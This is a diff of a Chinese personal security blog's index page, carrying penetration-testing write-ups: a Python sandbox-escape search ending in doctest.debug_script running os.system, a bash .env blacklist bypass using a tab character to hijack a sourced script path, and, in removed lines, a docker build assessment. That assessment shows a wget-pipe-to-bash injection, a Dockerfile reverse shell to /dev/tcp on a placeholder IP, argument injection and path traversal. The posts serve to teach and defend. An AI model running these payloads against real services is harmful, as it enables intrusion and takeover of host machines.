+<p>结果测出很多函数都可以正常运行，没有报错。</p>
+<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
+<p>测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
+
+<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
+<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
+<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
+<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
+
+<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
+<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
+<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
+<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
+
+<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
+<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
+<p>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>结果 \x09 也就是 \t 可以生成新变量。</p>
+<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
+<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
+<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
+<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
 
       
     </div>
@@ -897,220 +1288,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
-<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
-<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
-
-<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
-<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
-<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
-<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
-
-<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
-<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
-<p>代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>结果 \x09 也就是 \t 可以生成新变量。</p>
-<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
-<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
-<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
-<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%22docker%20build%22%E6%97%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%22docker%20build%22%E6%97%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">docker build时的安全问题</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-01-17 23:38:43" itemprop="dateModified" datetime="2022-01-17T23:38:43+08:00">2022-01-17</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>业务提供一个功能：根据用户的代码仓库编译镜像，并且管理镜像。</p>
-<p>编译镜像时的业务实现类似下面这样，其中image_name_tag、dockerfile_file、dockerfile_path变量都是从外部web入口传入的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build $&#123;DOCKER_BUILD_ARG&#125; -t $&#123;image_name_tag&#125; -f $&#123;dockerfile_file&#125; $&#123;dockerfile_path&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果你是这个业务的研发或者安全测试人员，你觉得这里会产生哪些安全漏洞？</p>
-<h1 id="我的分析"><a href="#我的分析" class="headerlink" title="我的分析"></a>我的分析</h1><ul>
-<li><p>命令执行</p>
-<p>我想大家第一个都会想到”命令执行漏洞”：image_name_tag变量如果用户传入<code>`wget -c http://xxx/x.sh | bash -c`</code>就能执行远程服务器上的脚本，拿到宿主机服务器权限。</p>
-<p>如果研发大哥对传入的变量做了黑名单呢(比如判断是否包含<code>$</code>、<code>`</code>)，还有其他安全漏洞吗？</p>
-</li>
-<li><p>Dockerfile中反弹shell</p>
-<p><code>-f $&#123;dockerfile_file&#125;</code>这里Dockerfile的内容是用户可控的，所以也很容易想到：我们可以在Dockerfile中写任意命令，获取到”反弹shell”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Victor Coisne victor.coisne@dotcloud.com</span><br><span class="line">RUN echo &quot;while ((1));do sleep 1;&#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xxxx 0&gt;&amp;1;done&quot; &gt;&gt; &#x2F;tmp&#x2F;1.sh    # x.x.x.x&#x2F;xxxx是ip和端口</span><br><span class="line">RUN bash &#x2F;tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure>
-<p>在”反弹shell”中我们可以尝试去访问”dockerd服务”所在的宿主机网络，或者宿主机能访问到的网络，然后可以去测试网络中的脆弱服务。</p>
-<p>如果研发大哥在这里用iptables对容器和宿主机网络做了隔离，还有其他安全漏洞吗？</p>
-</li>
-<li><p>用户数据泄漏</p>
-<p>Dockerfile中的第一行<code>FROM</code>如果我填写其他用户编译好的镜像名称，是不是有可能读到其他用户镜像呢？</p>
-<p>虽然”镜像名称”难猜中，但是这个风险确实是存在的。</p>
-<p>如果研发大哥在构建镜像并推送到镜像仓库后，然后用<code>docker rmi</code>清空本地的镜像缓存，就不存在这种风险了，那还有其他安全漏洞吗？</p>
-</li>
-<li><p>给所有镜像种个后门</p>
-<p>image_name_tag是编译后的镜像名，Dockerfile中的第一行<code>FROM</code>指令又需要一个基础镜像，那么是否存在如下可能：A用户使用的基础镜像是B用户build生成。如果存在这个可能，那一个恶意用户build生成带后门的nginx、ubuntu等基础镜像，就可以导致其他用户的生成镜像时都带上后门。</p>
-<p>测试后，发现”dockerd服务”默认会使用本地镜像，所以会出现上面的问题。</p>
-<blockquote>
-<p>  –pull=true|false</p>
-<pre><code>    Always attempt to pull a newer version of the image. The default is false.</code></pre>
-</blockquote>
-<p>如果研发大哥使用了<code>docker build --pull=true</code>每次拉取最新镜像，还有其他安全漏洞吗？</p>
-</li>
-<li><p>命令参数注入<code>--network host</code></p>
-<p>如果传入image_name_tag参数值是<code>xxx --network host</code>,可以达到<code>docker build xxx --network host</code>的效果，配合Dockerfile中反弹shell，可以让shell和”dockerd服务”处于同一个网络。这样iptables对容器和宿主机的网络隔离就不起作用了。</p>
-<p>当然你还可以注入<code>--build-arg</code>读宿主机环境变量，或者看看<code>docker build</code>还有没有其他的命令行参数可以拿来利用。</p>
-<p>如果研发大哥对参数值判断了，不允许<code>-</code>符号传入呢，还有其他安全漏洞吗？</p>
-</li>
-<li><p>服务数据泄漏</p>
-<p>下面的命令可以把”docker客户端”的<code>/tmp</code>、<code>../../</code>目录下的文件全部拷贝到”编译容器”中，配合Dockerfile中反弹shell，可以在shell中读到”docker客户端”机器上的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -f .&#x2F;Dockerfile &#x2F;tmp</span><br><span class="line">docker build -f .&#x2F;Dockerfile ..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>同时你可能需要用.dockersignore文件忽略某些文件或目录，避免一些大文件被拷贝到”编译容器”。</p>
-<p>所以如果用户传入dockerfile_path参数为<code>../../</code>这种形式的路径，是可以读到机器上的文件。</p>
-<p>如果研发大哥判断用户传入的参数，不允许出现<code>..</code>这种目录跳转，还有其他安全漏洞吗？</p>
-<p>emm，反正我想不到其他的攻击点了。</p>
-<p>另外我想补充说明一下，docker是一个cs架构的软件，所以在做漏洞利用时需要清楚我们是在谁的网络环境下、读谁的文件（谁指的是客户端还是服务端）</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了一个docker相关的安全评估的案例，包括其中的风险点和修复措施，希望你能有点收获。</p>
-<p>在做这个评估时，我的感受是：有时候业务评估非常依赖评估人员自身的经验，并且好像没有办法依赖一个方法论(比如stride)评估出所有风险点。</p>
-<p>PS：欢迎读者与我讨论、指正文章内容。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
